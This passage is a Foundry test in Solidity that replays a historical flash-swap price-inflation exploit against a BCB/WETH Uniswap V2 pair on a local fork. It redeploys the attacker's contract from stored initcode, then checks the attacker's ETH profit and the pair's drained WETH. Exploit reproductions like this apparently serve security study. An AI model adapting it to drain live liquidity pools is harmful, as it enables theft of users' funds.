    function setUp() public {
        // Online warm: use mainnet alias; exhaustive_warm rewrites to anvil localhost.
        vm.createSelectFork("http://127.0.0.1:8545", FORK_BLOCK);
        fundingToken = address(0); // native ETH
        attacker = ATTACKER;
    }

    function testExploit() public balanceLog {
        require(IUniswapV2Pair(PAIR).token0() == BCB, "pair token0 != BCB");
        require(IUniswapV2Pair(PAIR).token1() == WETH, "pair token1 != WETH");
        require(IERC20(BCB).decimals() == 9, "unexpected BCB decimals");
        require(ERC1155_STAKE.code.length > 0, "erc1155 stake missing");

        uint256 pairWethBefore = IERC20(WETH).balanceOf(PAIR);
        uint256 attackerBefore = ATTACKER.balance;

        // Replay historical CREATE (attacker nonce 0 → ATTACK_CONTRACT).
        // Nested helpers + flash swap + inflate + dump run in the constructor path.
        vm.startPrank(ATTACKER, ATTACKER);
        vm.setNonce(ATTACKER, 0);
        address deployed;
        bytes memory initcode = CREATE_INITCODE;
        assembly {
            deployed := create(0, add(initcode, 0x20), mload(initcode))
        }
        require(deployed != address(0), "CREATE failed");
        require(deployed == ATTACK_CONTRACT, "CREATE address mismatch");
        vm.stopPrank();

        uint256 profit = ATTACKER.balance - attackerBefore;
        uint256 pairWethAfter = IERC20(WETH).balanceOf(PAIR);

        assertEq(profit, EXPECTED_PROFIT, "attacker ETH profit mismatch");
        // Pair loses at least the profit amount of WETH (fee/router path may differ slightly
        // vs pure pair drain; assert pair WETH decreased).
        require(pairWethBefore > pairWethAfter, "pair WETH not drained");

        emit log_named_decimal_uint("Attacker ETH profit", profit, 18);
        emit log_named_decimal_uint("Pair WETH before", pairWethBefore, 18);
        emit log_named_decimal_uint("Pair WETH after", pairWethAfter, 18);
        emit log_named_uint("Flash BCB raw (9 dec)", FLASH_BCB_RAW);
        emit log_named_address("Attack factory", deployed);
        emit log_named_address("ERC-1155 stake module", ERC1155_STAKE);
        emit log_named_address("BCB token", BCB);
        emit log_named_address("BCB/WETH pair", PAIR);
    }
